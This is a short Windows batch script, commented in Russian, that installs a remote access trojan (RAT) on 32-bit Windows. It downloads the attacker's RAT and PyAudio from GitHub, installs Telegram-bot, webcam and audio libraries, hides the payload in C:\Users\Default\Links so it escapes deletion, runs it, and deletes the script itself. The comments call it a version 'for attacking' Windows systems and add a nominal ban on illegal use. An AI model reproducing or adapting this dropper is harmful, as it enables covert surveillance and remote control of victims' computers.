rem После слова "rem" идут комментарии. Они не учитываются при работе программы.
rem Комментарии - лишь небольшие уточнения, полный мануал - в статье.
rem Использовать в противозаконных целях - СТРОГО ЗАПРЕЩЕНО!
rem Это версия для атаки 32-битных систем на базе Windows.
@echo off
cd Downloads
explorer https://github.com/*/remote/raw/master/PyAudio-0.2.11-cp38-cp38-win32.whl
rem Скачивает библиотеку PyAudio 32-bit в папку Downloads.
explorer https://github.com/*/**/raw/master/***
rem Скачивает ваш RAT в папку Downloads.
rem Замените * на ваш юзернейм в GitHub, ** на название вашего репозитория, *** на имя вашего файла (RAT).
pip3 install pytelegrambotapi opencv-python pypiwin32 comtypes pillow pycaw
rem Устанавливает все необходимые библиотеки.
pip install PyAudio-0.2.11-cp38-cp38-win32.whl
rem Устанавливает дополнительную библиотеку PyAudio.
move *** C:\Users\Default\Links
rem Переносит файл в скрытую и обычно никому не нужную папку, что позволит избежать удаления файла.
rem Замените *** на название файла из 9 строки.
start C:\Users\Default\Links\***
rem Выполняет скрипт нашего RAT.
rem Замените *** на название файла из 9 строки.
del setup_32_comment.bat